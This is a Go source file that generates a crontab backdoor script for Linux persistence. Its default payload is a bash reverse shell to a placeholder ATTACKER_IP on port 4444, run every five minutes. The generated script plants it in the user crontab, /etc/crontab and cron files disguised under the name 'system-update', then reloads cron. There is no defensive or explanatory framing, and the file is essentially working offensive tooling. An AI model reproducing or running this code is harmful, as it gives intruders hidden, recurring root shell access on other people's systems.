package crontab

import (
	"fmt"
	"os"
	"path/filepath"
	"text/template"
	"time"
)

type CrontabBackdoor struct {
	Schedule   string
	Command    string
	BackupPath string
}

func NewCrontabBackdoor() *CrontabBackdoor {
	return &CrontabBackdoor{
		Schedule:   "*/5 * * * *",
		Command:    "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
		BackupPath: "/tmp/.backup",
	}
}

func (c *CrontabBackdoor) GeneratePayload(outDir string) error {
	mainScript := `#!/bin/bash
# Crontab Backdoor Generator
# Generated at: {{.Timestamp}}

SHELL_CMD="{{.Command}}"
SCHEDULE="{{.Schedule}}"
BACKUP_PATH="{{.BackupPath}}"

# Backup original crontab
crontab -l > $BACKUP_PATH 2>/dev/null

# Add persistence methods
echo "$SCHEDULE $SHELL_CMD" >> /etc/crontab
(crontab -l 2>/dev/null; echo "$SCHEDULE $SHELL_CMD") | crontab -

# Add to additional locations for persistence
echo "$SCHEDULE root $SHELL_CMD" >> /etc/cron.d/system-update
echo "$SCHEDULE root $SHELL_CMD" >> /etc/cron.daily/system-update

# Make sure cron is running
service cron reload 2>/dev/null || service crond reload 2>/dev/null

# Cleanup
echo "[+] Crontab backdoor installed"
echo "[+] Original crontab backed up to $BACKUP_PATH"
`

	scriptPath := filepath.Join(outDir, "crontab_backdoor.sh")
	return c.writeFile(scriptPath, mainScript, struct {
		Timestamp  string
		Schedule   string
		Command    string
		BackupPath string
	}{
		Timestamp:  time.Now().Format("2006-01-02 15:04:05"),
		Schedule:   c.Schedule,
		Command:    c.Command,
		BackupPath: c.BackupPath,
	})
}

func (c *CrontabBackdoor) writeFile(filepath string, content string, data interface{}) error {
	tmpl, err := template.New("crontab").Parse(content)
	if err != nil {
		return fmt.Errorf("failed to parse template: %v", err)
	}

	f, err := os.Create(filepath)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer f.Close()

	if err := tmpl.Execute(f, data); err != nil {
		return fmt.Errorf("failed to execute template: %v", err)
	}

	return os.Chmod(filepath, 0755)
}
